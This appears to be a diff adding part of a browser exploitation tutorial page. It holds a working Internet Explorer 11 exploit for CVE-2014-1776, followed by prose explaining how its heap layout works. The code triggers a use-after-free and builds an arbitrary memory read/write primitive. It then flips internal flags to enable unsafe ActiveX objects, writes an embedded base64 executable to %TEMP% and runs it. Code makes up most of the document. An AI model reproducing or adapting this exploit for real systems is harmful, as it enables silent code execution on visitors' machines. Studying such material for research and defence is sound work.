+      this["removeNode"](true)
+      document.createElement("CVE-2014-1776").title = ""
+      
+      var elem = document.createElement("div");
+      elem.className = getPattern([
+        0xa4, magic_addr + 0x20 - 0xc,      // X; X+0xc --&gt; b[0]
+        0x118, magic_addr + 0x24 + 0x24,    // U; U --&gt; (*); U-0x24 --&gt; b[1]
+        0x198, -1                           // bit 12 set
+      ], 0x428);
+    }
+    head.firstChild.nextSibling.disabled = head
+  }
+
+  // The object is 0x428 bytes.
+  // Conditions to control the bug and force an INC of dword at magic_addr + 0x1b:
+  //   X = [ptr+0A4h] ==&gt; Y = [X+0ch] ==&gt;
+  //               [Y+208h] is 0
+  //               [Y+630h+248h] = [Y+878h] val to inc!      &lt;======
+  //               [Y+630h+380h] = [Y+9b0h] has bit 16 set
+  //               [Y+630h+3f4h] = [Y+0a24h] has bit 7 set
+  //               [Y+1044h] is 0
+  //   U = [ptr+118h] ==&gt; [U] is 0 =&gt; V = [U-24h] =&gt; W = [V+1ch],
+  //               [W+0ah] has bit 1 set &amp; bit 4 unset
+  //               [W+44h] has bit 7 set
+  //               [W+5ch] is writable
+  //   [ptr+198h] has bit 12 set
+ 
+  window.onload = function() {
+    CollectGarbage();
+ 
+    var header_size = 0x20;
+    var array_len = (0x10000 - header_size)/4;
+    var a = new Array();
+    for (var i = 0; i &lt; 0x1000; ++i) {
+      a[i] = new Array(array_len);
+
+      var idx;
+      b = a[i];
+      b[0] = magic_addr + 0x1b - 0x878;         // Y
+      idx = Math.floor((b[0] + 0x9b0 - (magic_addr + 0x20))/4);         // index for Y+9b0h
+      b[idx] = -1; b[idx+1] = -1;
+      idx = Math.floor((b[0] + 0xa24 - (magic_addr + 0x20))/4);         // index for Y+0a24h
+      b[idx] = -1; b[idx+1] = -1;
+      idx = Math.floor((b[0] + 0x1044 - (magic_addr + 0x20))/4);        // index for Y+1044h
+      b[idx] = 0; b[idx+1] = 0;
+      // The following address would be negative so we add 0x10000 to translate the address
+      // from the previous copy of the array to this one.
+      idx = Math.floor((b[0] + 0x208 - (magic_addr + 0x20) + 0x10000)/4);   // index for Y+208h
+      b[idx] = 0; b[idx+1] = 0;
+ 
+      b[1] = magic_addr + 0x28 - 0x1c;          // V, [U-24h]; V+1ch --&gt; b[2]
+      b[(0x24 + 0x24 - 0x20)/4] = 0;            // [U] (*)
+      b[2] = magic_addr + 0x2c - 0xa;           // W; W+0ah --&gt; b[3]
+      b[3] = 2;                                 // [W+0ah]
+      idx = Math.floor((b[2] + 0x44 - (magic_addr + 0x20))/4);      // index for W+44h
+      b[idx] = -1; b[idx+1] = -1;
+    }
+    
+    //           /------- allocation header -------\ /--------- buffer header ---------\
+    // 0c000000: 00000000 0000fff0 00000000 00000000 00000000 00000001 00003ff8 00000000
+    //                                                       array_len buf_len
+    
+//    alert("Modify the \"Buffer length\" field of the Array at 0x" + magic_addr.toString(16));
+    trigger();
+    
+    // Locate the modified Array.
+    idx = -1;
+    for (var i = 0; i &lt; 0x1000 - 1; ++i) {
+      // We try to modify the first element of the next Array.
+      a[i][array_len + header_size/4] = 1;
+      
+      // If we successfully modified the first element of the next Array, then a[i]
+      // is the Array whose length we modified.
+      if (a[i+1][0] == 1) {
+        idx = i;
+        break;
+      }
+    }
+    
+    if (idx == -1) {
+//      alert("Can't find the modified Array");
+      window.location.reload();
+      return;
+    }
+    
+    // Modify the second Array for reading/writing everywhere.
+    a[idx][array_len + 0x14/4] = 0x3fffffff;
+    a[idx][array_len + 0x18/4] = 0x3fffffff;
+    a[idx+1].length = 0x3fffffff;
+    var base_addr = magic_addr + 0x10000 + header_size;
+    
+    // Very Important:
+    //    The numbers in Array are signed int32. Numbers greater than 0x7fffffff are
+    //    converted to 64-bit floating point.
+    //    This means that we can't, for instance, write
+    //        a[idx+1][index] = 0xc1a0c1a0;
+    //    The number 0xc1a0c1a0 is too big to fit in a signed int32.
+    //    We'll need to represent 0xc1a0c1a0 as a negative integer:
+    //        a[idx+1][index] = -(0x100000000 - 0xc1a0c1a0);
+    
+    function int2uint(x) {
+      return (x &lt; 0) ? 0x100000000 + x : x;
+    }
+
+    function uint2int(x) {
+      return (x &gt;= 0x80000000) ? x - 0x100000000 : x;
+    }
+
+    // The value returned will be in [0, 0xffffffff].
+    function read(addr) {
+      var delta = addr - base_addr;
+      var val;
+      if (delta &gt;= 0)
+        val = a[idx+1][delta/4];
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        val = a[idx+1][(0x100000000 + delta)/4];
+      
+      return int2uint(val);
+    }
+    
+    // val must be in [0, 0xffffffff].
+    function write(addr, val) {
+      val = uint2int(val);
+      
+      var delta = addr - base_addr;
+      if (delta &gt;= 0)
+        a[idx+1][delta/4] = val;
+      else
+        // In 2-complement arithmetic,
+        //   -x/4 = (2^32 - x)/4
+        a[idx+1][(0x100000000 + delta)/4] = val;
+    }
+    
+    function get_addr(obj) {
+      a[idx+2][0] = obj;
+      return read(base_addr + 0x10000);
+    }
+    
+    // Here's the beginning of the element div:
+    //      +----- jscript9!HostDispatch::`vftable' = jscript9 + 0x5480
+    //      v
+    //  6cc55480 05354280 00000000 0536cfb0
+    //
+    // To find the vftable MSHTML!CDivElement::`vftable', we must follow a chain of pointers:
+    //   X = [div_elem+0ch]
+    //   X = [X+8]
+    //   obj_ptr = [X+10h]
+    //   vftptr = [obj_ptr]
+    // where vftptr = vftable MSHTML!CDivElement::`vftable' = mshtml + 0x3aeb04.
+    var addr = get_addr(document.createElement("div"));
+    jscript9 = read(addr) - 0x5480;
+    mshtml = read(read(read(read(addr + 0xc) + 8) + 0x10)) - 0x3aeb04;
+
+    var old1 = read(mshtml+0xebcd98+0x10);
+    var old2 = read(mshtml+0xebcd98+0x14);
+
+    function GodModeOn() {
+      write(mshtml+0xebcd98+0x10, jscript9+0x155e19);
+      write(mshtml+0xebcd98+0x14, jscript9+0x155d7d);
+    }
+    
+    function GodModeOff() {
+      write(mshtml+0xebcd98+0x10, old1);
+      write(mshtml+0xebcd98+0x14, old2);
+    }
+
+    // content of exe file encoded in base64.
+    runcalc = 'TVqQAAMAAAAEAAAA//8AALgAAAAAA &lt;snipped&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
+ 
+    function createExe(fname, data) {
+      GodModeOn();
+      var tStream = new ActiveXObject("ADODB.Stream");
+      var bStream = new ActiveXObject("ADODB.Stream");
+      GodModeOff();
+      
+      tStream.Type = 2;       // text
+      bStream.Type = 1;       // binary
+      tStream.Open();
+      bStream.Open();
+      tStream.WriteText(data);
+      tStream.Position = 2;       // skips the first 2 bytes in the tStream (what are they?)
+      tStream.CopyTo(bStream);
+      
+      var bStream_addr = get_addr(bStream);
+      var string_addr = read(read(bStream_addr + 0x50) + 0x44);
+      if (read(string_addr) != 0) {         // only when there is a string to overwrite
+        write(string_addr, 0x003a0043);       // 'C:'
+        write(string_addr + 4, 0x0000005c);   // '\'
+      }
+      try {
+        bStream.SaveToFile(fname, 2);     // 2 = overwrites file if it already exists
+      }
+      catch(err) {
+        return 0;
+      }
+      
+      tStream.Close();
+      bStream.Close();
+      return 1;
+    }
+
+    // decoder
+    // [https://gist.github.com/1020396] by [https://github.com/atk]
+    function atob(input) {
+      var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+      var str = String(input).replace(/=+$/, '');
+      if (str.length % 4 == 1) {
+        throw new InvalidCharacterError("'atob' failed: The string to be decoded is not correctly encoded.");
+      }
+      for (
+        // initialize result and counters
+        var bc = 0, bs, buffer, idx = 0, output = '';
+        // get next character
+        buffer = str.charAt(idx++);
+        // character found in table? initialize bit storage and add its ascii value;
+        ~buffer &amp;&amp; (bs = bc % 4 ? bs * 64 + buffer : buffer,
+          // and if not first of each 4 characters,
+          // convert the first 8 bits to one ascii character
+          bc++ % 4) ? output += String.fromCharCode(255 &amp; bs &gt;&gt; (-2 * bc &amp; 6)) : 0
+      ) {
+        // try to find character in table (0-63, not found =&gt; -1)
+        buffer = chars.indexOf(buffer);
+      }
+      return output;
+    }
+
+    function decode(b64Data) {
+      var data = atob(b64Data);
+      
+       // Now data is like
+      //   11 00 12 00 45 00 50 00 ...
+      // rather than like
+      //   11 12 45 50 ...
+      // Let's fix this!
+      var arr = new Array();
+      for (var i = 0; i &lt; data.length / 2; ++i) {
+        var low = data.charCodeAt(i*2);
+        var high = data.charCodeAt(i*2 + 1);
+        arr.push(String.fromCharCode(low + high * 0x100));
+      }
+      return arr.join('');
+    }
+
+    GodModeOn();
+    var shell = new ActiveXObject("WScript.shell");
+    GodModeOff();
+    fname = shell.ExpandEnvironmentStrings("%TEMP%\\runcalc.exe");
+    if (createExe(fname, decode(runcalc)) == 0) {
+//      alert("SaveToFile failed");
+      window.location.reload();
+      return 0;
+    }
+    shell.Exec(fname);
+ 
+//    alert("Done");
+  }
+&lt;/script&gt;
+&lt;/head&gt;
+&lt;body&gt;&lt;v:group id="vml" style="width:500pt;"&gt;&lt;div&gt;&lt;/div&gt;&lt;/group&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Once again, I snipped <span style="color: #00ff00;">runcalc</span>. You can download the full code from here: <a href="code/code8.zip">code8</a>.</p><p>This code works fine but IE may crash from time to time. This isn’t a major problem because when the user closes the crash dialog box the page is reloaded and the exploit is run again.</p><p>The new code has some subtleties so let’s discuss the important points. Let’s start with <span style="color: #00ff00;">trigger()</span>:</p>
+
+<pre><code class="language-js">  function trigger() {
+    var head = document.getElementById("haed")
+    tmp = document.createElement("CVE-2014-1776")
+    document.getElementById("vml").childNodes[0].appendChild(tmp)
+    tmp.appendChild(head)
+    tmp = head.offsetParent
+    tmp.onpropertychange = function(){
+      this["removeNode"](true)
+      document.createElement("CVE-2014-1776").title = ""
+      
+      var elem = document.createElement("div");
+      elem.className = getPattern([
+        0xa4, magic_addr + 0x20 - 0xc,      // X; X+0xc --&gt; b[0]
+        0x118, magic_addr + 0x24 + 0x24,    // U; U --&gt; (*); U-0x24 --&gt; b[1]
+        0x198, -1                           // bit 12 set
+      ], 0x428);
+    }
+    head.firstChild.nextSibling.disabled = head
+  }
+</code></pre>
+  
+  <p>The function <span style="color: #00ff00;">getPattern</span> takes an array of the form</p>
+  
+<pre><code class="language-js">[offset_1, value_1,
+ offset_2, value_2,
+ offset_3, value_3,
+ ...]
+</code></pre>
+ 
+ <p>and the size in bytes of the pattern. The pattern returned is a string of the specified size which <span style="color: #00ff00;">value_1</span>, <span style="color: #00ff00;">value_2</span>, etc… at the specified offsets.</p><p>I hope the comments are clear enough. For instance, let’s consider this line:</p>
+ 
+<pre><code class="language-js">        0xa4, magic_addr + 0x20 - 0xc,      // X; X+0xc --&gt; b[0]
+</code></pre>
+ 
+ <p>This means that</p><pre class="ignore:true">X = magic_addr + 0x20 - 0xc</pre><p>which is defined in a way that <span style="color: #00ff00;">X+0xc</span> points to <span style="color: #00ff00;">b[0]</span>, where <span style="color: #00ff00;">b[0]</span> is the first element of the <span style="color: #00ff00;">Array</span> at <span style="color: #00ff00;">magic_addr</span> (<span style="color: #00ff00;">0xc000000</span> in our code).</p><p>To understand this better, let’s consider the full schema:</p>
+ 
+<pre><code class="language-js">  .
+  .
+  .
+  elem.className = getPattern([
+    0xa4, magic_addr + 0x20 - 0xc,      // X; X+0xc --&gt; b[0]
+    0x118, magic_addr + 0x24 + 0x24,    // U; U --&gt; (*); U-0x24 --&gt; b[1]
+    0x198, -1                           // bit 12 set
+  ], 0x428);
+  .
+  .
+  .
+  // The object is 0x428 bytes.
+  // Conditions to control the bug and force an INC of dword at magic_addr + 0x1b:
+  //   X = [ptr+0A4h] ==&gt; Y = [X+0ch] ==&gt;
+  //               [Y+208h] is 0
+  //               [Y+630h+248h] = [Y+878h] val to inc!      &lt;======
+  //               [Y+630h+380h] = [Y+9b0h] has bit 16 set
+  //               [Y+630h+3f4h] = [Y+0a24h] has bit 7 set
+  //               [Y+1044h] is 0
+  //   U = [ptr+118h] ==&gt; [U] is 0 =&gt; V = [U-24h] =&gt; W = [V+1ch],
+  //               [W+0ah] has bit 1 set &amp; bit 4 unset
+  //               [W+44h] has bit 7 set
+  //               [W+5ch] is writable
+  //   [ptr+198h] has bit 12 set
+ 
+  window.onload = function() {
+    CollectGarbage();
+ 
+    var header_size = 0x20;
+    var array_len = (0x10000 - header_size)/4;
+    var a = new Array();
+    for (var i = 0; i &lt; 0x1000; ++i) {
+      a[i] = new Array(array_len);
+
+      var idx;
+      b = a[i];
+      b[0] = magic_addr + 0x1b - 0x878;         // Y
+      idx = Math.floor((b[0] + 0x9b0 - (magic_addr + 0x20))/4);         // index for Y+9b0h
+      b[idx] = -1; b[idx+1] = -1;
+      idx = Math.floor((b[0] + 0xa24 - (magic_addr + 0x20))/4);         // index for Y+0a24h
+      b[idx] = -1; b[idx+1] = -1;
+      idx = Math.floor((b[0] + 0x1044 - (magic_addr + 0x20))/4);        // index for Y+1044h
+      b[idx] = 0; b[idx+1] = 0;
+      // The following address would be negative so we add 0x10000 to translate the address
+      // from the previous copy of the array to this one.
+      idx = Math.floor((b[0] + 0x208 - (magic_addr + 0x20) + 0x10000)/4);   // index for Y+208h
+      b[idx] = 0; b[idx+1] = 0;
+ 
+      b[1] = magic_addr + 0x28 - 0x1c;          // V, [U-24h]; V+1ch --&gt; b[2]
+      b[(0x24 + 0x24 - 0x20)/4] = 0;            // [U] (*)
+      b[2] = magic_addr + 0x2c - 0xa;           // W; W+0ah --&gt; b[3]
+      b[3] = 2;                                 // [W+0ah]
+      idx = Math.floor((b[2] + 0x44 - (magic_addr + 0x20))/4);      // index for W+44h
+      b[idx] = -1; b[idx+1] = -1;
+    }
+</code></pre>
+    
+    <p>Let’s consider this part of the schema:</p>
+    
+<pre><code class="language-js">  //   X = [ptr+0A4h] ==&gt; Y = [X+0ch] ==&gt;
+  //               [Y+208h] is 0
+  //               [Y+630h+248h] = [Y+878h] val to inc!      &lt;======
+</code></pre>
+  
+  <p>As we’ve seen,</p>
+
+<pre><code class="language-js">0xa4, magic_addr + 0x20 - 0xc,      // X; X+0xc --&gt; b[0]
+</code></pre>
+  
+  <p>means that</p><pre class="ignore:true">X = [ptr+0A4h] = magic_addr + 0x20 - 0xc</pre><p>so that <span style="color: #00ff00;">X+0cx</span> points to <span style="color: #00ff00;">b[0]</span>.</p><p>Then we have</p>
+  
+<pre><code class="language-js">b[0] = magic_addr + 0x1b - 0x878;         // Y
+</code></pre>
+  
+  <p>which means that</p><pre class="ignore:true">Y = [X+0ch] = magic_addr + 0x1b - 0x878</pre><p>The schema tells us that <span style="color: #00ff00;">[Y+878h]</span> must be the value to increment. Indeed, <span style="color: #00ff00;">Y+0x878</span> is <span style="color: #00ff00;">magic_addr + 0x1b</span> which points to the highest byte of the length of the <span style="color: #00ff00;">Array</span> at <span style="color: #00ff00;">magic_addr</span> (<span style="color: #00ff00;">0xc000000</span> in our code). Note that we increment the dword at <span style="color: #00ff00;">magic_addr + 0x1b</span> which has the effect of incrementing the byte at the same address.</p><p>The schema also dictates that <span style="color: #00ff00;">[Y+208h]</span> be <span style="color: #00ff00;">0</span>. This is accomplished by the following lines:</p>
+  
+<pre><code class="language-js">idx = Math.floor((b[0] + 0x208 - (magic_addr + 0x20) + 0x10000)/4);   // index for Y+208h
+b[idx] = 0; b[idx+1] = 0;
+</code></pre>
+
+<p>Here there are two important points:</p><ol><li><span style="color: #00ff00;">Y = b[0] = magic_addr + 0x1b – 0x878</span> so it’s not a multiple of <span style="color: #00ff00;">4</span>. Because of this, <span style="color: #00ff00;">Y+208h</span> isn’t a multiple of <span style="color: #00ff00;">4</span> either. To modify the misaligned dword <span style="color: #00ff00;">[Y+208h]</span>, we need to modify the dwords <span style="color: #00ff00;">[Y+206h]</span> and<span style="color: #00ff00;"> [Y+20ah]</span> which coincide with the elements<span style="color: #00ff00;"> b[idx]</span> and <span style="color: #00ff00;">b[idx+1]</span>. That’s why we use <span style="color: #00ff00;">Math.floor</span>.</li><li>The computed value <span style="color: #00ff00;">b[0] + 0x208 – (magic_addr + 0x20)</span> is negative. Because we’ve chosen <span style="color: #00ff00;">Y</span> so that <span style="color: #00ff00;">Y+878h</span> points to the header of the <span style="color: #00ff00;">Array</span> at <span style="color: #00ff00;">magic_addr</span>, <span style="color: #00ff00;">Y+9b0h</span> and <span style="color: #00ff00;">Y+0a24h</span> (see the schema) point to the same <span style="color: #00ff00;">Array</span>, but <span style="color: #00ff00;">Y+208h</span> points to the previous <span style="color: #00ff00;">Array</span>. Every <span style="color: #00ff00;">Array</span> will have the same content so, since adjacent <span style="color: #00ff00;">Arrays</span> are <span style="color: #00ff00;">0x10000</span> bytes apart, by writing the value into the memory at address <span style="color: #00ff00;">Y+208h+10000h</span> (i.e. in the current <span style="color: #00ff00;">Array</span>), we’ll also end up writing that value into the memory at address <span style="color: #00ff00;">Y+208h</span>.</li></ol><p>To conclude our discussion, note that the function <span style="color: #00ff00;">trigger</span> is called only once. A single increment is more than enough because we just need to write a few bytes beyond the end of the <span style="color: #00ff00;">Array</span> at <span style="color: #00ff00;">magic_addr</span>.</p><p style="text-align: center; font-size: 40px;">← <a href="ie11-part-1.html">Prev Part</a></p> </div></div>
+
+</body>
+</html>
